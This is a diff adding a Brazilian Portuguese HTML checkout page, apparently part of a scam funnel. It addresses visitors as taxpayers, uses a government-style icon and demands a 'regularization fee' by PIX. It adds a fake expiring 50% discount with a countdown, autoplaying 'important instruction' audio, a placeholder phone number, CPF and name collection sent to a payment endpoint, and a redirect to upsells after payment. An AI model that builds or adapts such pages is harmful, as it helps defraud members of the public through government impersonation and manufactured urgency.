@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="utf-8">
+  <!-- Utmify: captura de UTMs (ver desen/js/utmify-tracking.js) -->
+  <script src="/desen/js/utmify-tracking.js"></script>
+  <!-- Pixel da Meta nativo + eventos Purchase/IC (ver desen/js/meta-pixel.js) -->
+  <script src="/desen/js/meta-pixel.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Atenção — Oferta Expirando</title>
+  <link rel="icon" type="image/png" sizes="32x32" href="/desen/images/iconegov.png">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>tailwind.config = { theme: { extend: { fontFamily: { poppins: ['Poppins', 'sans-serif'] } } } }</script>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <script src="/desen/js/utmify-order.js"></script>
+  <script src="/desen/js/catalogo.js"></script>
+  <style>
+    @keyframes slideUp { from { opacity: 0; transform: translateY(20px) } to { opacity: 1; transform: translateY(0) } }
+    @keyframes pulseBar { 0%, 100% { transform: scaleY(.4); opacity: .6 } 50% { transform: scaleY(1); opacity: 1 } }
+    @keyframes glow { 0%, 100% { box-shadow: 0 0 0 0 rgba(22, 197, 94, .4) } 50% { box-shadow: 0 0 0 10px rgba(22, 197, 94, 0) } }
+    @keyframes blink { 0%, 100% { opacity: 1 } 50% { opacity: .3 } }
+    .slide-up { animation: slideUp .5s ease both }
+    .bar { width: 4px; background: #1d4ed8; border-radius: 2px; transform-origin: center; animation: pulseBar 1s ease-in-out infinite }
+    .glow-btn { animation: glow 2s infinite }
+    .timer-urgent { animation: blink 1s infinite }
+    .pix-code-box { word-break: break-all; font-family: monospace; font-size: 11px; line-height: 1.5; background: #f8fafc; border: 1px dashed #94a3b8; border-radius: 10px; padding: 12px; color: #0f172a; text-align: left }
+    .spinner { display: inline-block; width: 14px; height: 14px; border: 2px solid #cbd5e1; border-top-color: #1d4ed8; border-radius: 50%; animation: spin .8s linear infinite; vertical-align: -2px; margin-right: 6px }
+    @keyframes spin { to { transform: rotate(360deg) } }
+    body { font-family: 'Poppins', sans-serif; background: #f3f4f6 }
+  </style>
+</head>
+
+<body class="font-poppins">
+  <main class="max-w-md mx-auto px-4 pt-8 pb-12 flex flex-col items-center gap-6 slide-up">
+
+    <!-- Atenção + nome -->
+    <div class="text-center">
+      <div class="text-5xl mb-3">⚠️</div>
+      <h1 class="text-2xl font-black text-gray-900">Atenção, <span id="firstName" class="text-blue-700">contribuinte</span>!</h1>
+      <p class="text-sm text-gray-600 mt-2">Seu acordo ainda está disponível. Liberamos um <strong class="text-green-700">desconto de 50%</strong> na taxa de regularização, válido só nos próximos minutos.</p>
+    </div>
+
+    <!-- Audio Player -->
+    <div class="w-full bg-white rounded-2xl shadow-lg border border-gray-100 p-5">
+      <div class="flex items-center gap-2 mb-4 text-blue-700 font-bold text-sm">
+        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M9.383 3.076A1 1 0 0110 4v12a1 1 0 01-1.707.707L4.586 13H2a1 1 0 01-1-1V8a1 1 0 011-1h2.586l3.707-3.707a1 1 0 011.09-.217zM14.657 2.929a1 1 0 011.414 0A9.972 9.972 0 0119 10a9.972 9.972 0 01-2.929 7.071 1 1 0 01-1.414-1.414A7.971 7.971 0 0017 10c0-2.21-.894-4.208-2.343-5.657a1 1 0 010-1.414z" />
+        </svg>
+        Instrução importante — ouça agora
+      </div>
+      <audio id="audioEl" src="audioback.mpeg" preload="auto"></audio>
+      <div class="flex items-center justify-center gap-1 mb-3" id="waveform" style="height:48px">
+        <div class="bar" style="height:16px;animation-delay:0s"></div>
+        <div class="bar" style="height:28px;animation-delay:.1s"></div>
+        <div class="bar" style="height:36px;animation-delay:.2s"></div>
+        <div class="bar" style="height:20px;animation-delay:.3s"></div>
+        <div class="bar" style="height:44px;animation-delay:.4s"></div>
+        <div class="bar" style="height:26px;animation-delay:.5s"></div>
+        <div class="bar" style="height:38px;animation-delay:.6s"></div>
+        <div class="bar" style="height:18px;animation-delay:.7s"></div>
+        <div class="bar" style="height:32px;animation-delay:.8s"></div>
+        <div class="bar" style="height:42px;animation-delay:.9s"></div>
+      </div>
+      <div class="w-full bg-gray-200 rounded-full h-1.5 mb-2">
+        <div id="audioProgress" class="bg-blue-600 h-1.5 rounded-full transition-all duration-300" style="width:0%"></div>
+      </div>
+      <div class="flex justify-between text-xs text-gray-400">
+        <span id="audioTime">0:00</span>
+        <span id="audioTotal">0:00</span>
+      </div>
+    </div>
+
+    <!-- Preço -->
+    <div class="w-full bg-white rounded-2xl shadow-lg border border-green-200 p-5 text-center">
+      <p class="text-xs text-gray-500 uppercase tracking-widest mb-1">Taxa de regularização</p>
+      <p class="text-sm text-gray-400 line-through">De <span id="precoDe">R$ 68,92</span></p>
+      <p class="text-4xl font-black text-green-700">por <span id="precoPor">R$ 34,46</span></p>
+      <p class="text-xs text-gray-500 mt-1">Pagamento único via PIX</p>
+    </div>
+
+    <!-- Countdown -->
+    <div class="text-center">
+      <p class="text-xs text-red-500 font-semibold uppercase tracking-widest mb-1">Desconto expira em</p>
+      <p id="timer" class="text-4xl font-black text-red-600">15:00</p>
+    </div>
+
+    <!-- CTA -->
+    <a id="checkoutBtn" href="#"
+      class="glow-btn w-full block text-center bg-gradient-to-r from-green-500 to-green-700 text-white text-lg font-black py-5 rounded-2xl shadow-xl hover:-translate-y-0.5 transition-all">
+      GERAR PIX COM 50% DE DESCONTO →
+    </a>
+    <div id="error-msg" class="hidden w-full text-sm text-red-700 bg-red-50 border border-red-200 rounded-xl p-3 text-center"></div>
+
+    <!-- PIX (aparece depois de gerar) -->
+    <div id="pix-section" class="hidden w-full bg-white rounded-2xl shadow-lg border border-gray-100 p-5 text-center">
+      <p class="text-xs text-green-700 font-bold uppercase tracking-widest mb-2">✓ Guia PIX com desconto emitida</p>
+      <p class="text-sm text-gray-600 mb-3">Valor: <strong id="pix-valor" class="text-gray-900">R$ 34,46</strong></p>
+      <div id="qr-wrap" class="flex justify-center mb-3"></div>
+      <div id="pix-code" class="pix-code-box mb-3"></div>
+      <button id="btn-copy" class="w-full bg-blue-700 text-white font-bold py-3 rounded-xl">COPIAR CÓDIGO PIX</button>
+      <div id="checking-payment" class="text-sm text-gray-600 mt-4"><span class="spinner"></span>Aguardando confirmação do pagamento...</div>
+      <p class="text-xs text-gray-500 mt-3">⚠️ Após pagar no aplicativo do seu banco, <u>volte para esta tela</u> para concluir a regularização.</p>
+    </div>
+
+    <p class="text-xs text-gray-400">Pagamento seguro via PIX · SSL 256-bit</p>
+
+  </main>
+
+  <script>
+    // Etapa desta página no catálogo do servidor (api/produtos.php): front com 50% off.
+    var ETAPA_BACK = 'back';
+    var ETAPA_FRONT = 'front';
+
+    var params = new URLSearchParams(window.location.search);
+    function soDigitos(v) { return String(v || '').replace(/\D/g, ''); }
+
+    var NOME = params.get('nome') || '';
+    var CPF = soDigitos(params.get('cpf'));
+    try {
+      if (!NOME) NOME = localStorage.getItem('site.nome') || '';
+      if (!CPF) CPF = soDigitos(localStorage.getItem('site.cpf'));
+    } catch (e) {}
+    if (!NOME) NOME = 'Contribuinte';
+    var PHONE = '11988887777';
+
+    var first = NOME && NOME !== 'Contribuinte' ? NOME.trim().split(/\s+/)[0] : null;
+    if (first) document.getElementById('firstName').textContent = first.charAt(0).toUpperCase() + first.slice(1).toLowerCase();
+
+    // Preços reais do catálogo (o HTML é só fallback)
+    if (typeof window.catalogoTexto === 'function') {
+      window.catalogoTexto(ETAPA_FRONT, '#precoDe', 'R$ {valor}');
+      window.catalogoTexto(ETAPA_BACK, '#precoPor', 'R$ {valor}');
+      window.catalogoTexto(ETAPA_BACK, '#pix-valor', 'R$ {valor}');
+    }
+
+    // Audio
+    var audio = document.getElementById('audioEl');
+    var progress = document.getElementById('audioProgress');
+    var timeEl = document.getElementById('audioTime');
+    var totalEl = document.getElementById('audioTotal');
+    var fmt = function (s) { return Math.floor(s / 60) + ':' + String(Math.floor(s % 60)).padStart(2, '0'); };
+    audio.addEventListener('loadedmetadata', function () { totalEl.textContent = fmt(audio.duration); });
+    audio.addEventListener('timeupdate', function () { if (!audio.duration) return; progress.style.width = (audio.currentTime / audio.duration * 100) + '%'; timeEl.textContent = fmt(audio.currentTime); });
+    audio.addEventListener('ended', function () { document.getElementById('waveform').style.opacity = '.4'; });
+    var tryPlay = function () { audio.play().catch(function () {}); };
+    document.addEventListener('DOMContentLoaded', tryPlay);
+    document.addEventListener('click', tryPlay, { once: true });
+
+    // Countdown
+    var secs = 15 * 60;
+    var timerEl = document.getElementById('timer');
+    var iv = setInterval(function () {
+      secs--;
+      if (secs <= 0) { clearInterval(iv); timerEl.textContent = 'EXPIRADO'; timerEl.classList.add('timer-urgent'); return; }
+      if (secs < 60) timerEl.classList.add('timer-urgent');
+      timerEl.textContent = Math.floor(secs / 60) + ':' + String(secs % 60).padStart(2, '0');
+    }, 1000);
+
+    // ===== PIX com desconto (mesmo fluxo do front, etapa 'back') =====
+    var pedidoAtual = null;
+    var pollingInterval = null;
+    var btn = document.getElementById('checkoutBtn');
+
+    function showError(msg) {
+      var el = document.getElementById('error-msg');
+      el.textContent = msg;
+      el.classList.remove('hidden');
+    }
+
+    async function gerarPix() {
+      btn.textContent = 'Gerando sua guia PIX...';
+      btn.style.pointerEvents = 'none';
+      try {
+        var body = new URLSearchParams();
+        body.set('nome', NOME);
+        body.set('cpf', CPF);
+        body.set('telefone', PHONE);
+        body.set('etapa', ETAPA_BACK);
+        ['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term', 'src', 'sck', 'gclid', 'fbclid', 'ttclid', 'leadId'].forEach(function (k) {
+          var v = params.get(k);
+          if (v) body.set(k, v);
+        });
+
+        var resp = await fetch('/api/pagamento.php', { method: 'POST', body: body });
+        var result = await resp.json();
+        if (!result || result.success === false) throw new Error((result && result.error) || 'Erro ao gerar PIX');
+
+        var pixCode = result.pixCode || (result.data && result.data.pix && (result.data.pix.qrcode || result.data.pix.code)) || '';
+        var txId = result.token || (result.data && result.data.id) || '';
+        if (!pixCode || !txId) throw new Error('Código PIX não recebido');
+
+        pedidoAtual = {
+          orderId: txId,
+          priceInCents: Math.round((result.valor || 0) * 100),
+          productName: result.product_title_used || '',
+          customer: { name: result.customer_name_used || NOME, email: result.customer_email_used || '', phone: PHONE, document: CPF }
+        };
+
+        // Utmify pendente + Meta InitiateCheckout (o servidor manda o IC também, mesmo id)
+        try { if (typeof window.utmifyEnviarPendente === 'function') window.utmifyEnviarPendente(pedidoAtual); } catch (e) { console.error('[Utmify] pendente', e); }
+        try { if (typeof window.metaInitiateCheckout === 'function') window.metaInitiateCheckout(pedidoAtual); } catch (e) { console.error('[Meta] IC', e); }
+
+        // Mostra o PIX
+        btn.classList.add('hidden');
+        document.getElementById('pix-section').classList.remove('hidden');
+        document.getElementById('pix-code').textContent = pixCode;
+        if (result.valor) document.getElementById('pix-valor').textContent = 'R$ ' + Number(result.valor).toFixed(2).replace('.', ',');
+
+        var qrWrap = document.getElementById('qr-wrap');
+        var qrImage = result.qrcodeImage || (result.data && result.data.pix && result.data.pix.qrcodeImage) || '';
+        if (qrImage) {
+          qrWrap.innerHTML = '<img src="' + qrImage + '" style="width:190px;height:190px;border-radius:8px" alt="QR Code PIX">';
+        } else {
+          qrWrap.innerHTML = '<div id="qr-render" style="width:190px;height:190px"></div>';
+          try {
+            new QRCode(document.getElementById('qr-render'), { text: pixCode, width: 190, height: 190, correctLevel: QRCode.CorrectLevel.M });
+          } catch (e) {
+            qrWrap.innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=190x190&data=' + encodeURIComponent(pixCode) + '" style="width:190px;height:190px;border-radius:8px" alt="QR Code PIX">';
+          }
+        }
+
+        document.getElementById('btn-copy').addEventListener('click', function () {
+          navigator.clipboard.writeText(pixCode).catch(function () {});
+          var b = document.getElementById('btn-copy');
+          b.textContent = '✓ CÓDIGO PIX COPIADO';
+          b.classList.replace('bg-blue-700', 'bg-green-700');
+          setTimeout(function () { b.textContent = 'COPIAR CÓDIGO PIX'; b.classList.replace('bg-green-700', 'bg-blue-700'); }, 2500);
+        });
+
+        document.getElementById('pix-section').scrollIntoView({ behavior: 'smooth', block: 'start' });
+        startPolling(txId);
+      } catch (err) {
+        console.error('Erro ao gerar PIX:', err);
+        showError('Não foi possível gerar o PIX agora. Tente novamente.');
+        btn.textContent = 'GERAR PIX COM 50% DE DESCONTO →';
+        btn.style.pointerEvents = '';
+      }
+    }
+
+    async function pago(txId) {
+      try {
+        var r = await fetch('/api/verificar.php?id=' + encodeURIComponent(txId), { cache: 'no-store' });
+        if (!r.ok) return false;
+        var st = await r.json();
+        var s = String(st.status || (st.data && st.data.status) || '').toUpperCase();
+        return s === 'PAID' || s === 'COMPLETED' || s === 'APPROVED' || s === 'AUTHORIZED';
+      } catch (e) { return false; }
+    }
+
+    function startPolling(txId) {
+      if (pollingInterval) clearInterval(pollingInterval);
+      pollingInterval = setInterval(async function () {
+        if (!(await pago(txId))) return;
+        clearInterval(pollingInterval);
+
+        // Conversão paga: Utmify + Meta (browser), o servidor manda os dois também.
+        try { if (pedidoAtual && typeof window.utmifyEnviarPago === 'function') window.utmifyEnviarPago(pedidoAtual); } catch (e) { console.error('[Utmify] pago', e); }
+        try { if (pedidoAtual && typeof window.metaPurchase === 'function') window.metaPurchase(pedidoAtual); } catch (e) { console.error('[Meta] Purchase', e); }
+
+        document.getElementById('checking-payment').innerHTML = '✅ <strong class="text-green-700">Pagamento confirmado!</strong> Redirecionando...';
+
+        // Mesmo destino do front depois de pagar: primeira etapa de upsell.
+        setTimeout(function () {
+          var np = new URLSearchParams(window.location.search);
+          np.set('cpf', CPF);
+          np.set('nome', NOME);
+          np.set('paid', 'true');
+          window.location.href = '/desen/upsells/1/?' + np.toString();
+        }, 2500);
+      }, 4500);
+    }
+
+    btn.addEventListener('click', function (e) { e.preventDefault(); gerarPix(); });
+  </script>
+</body>
+
+</html>
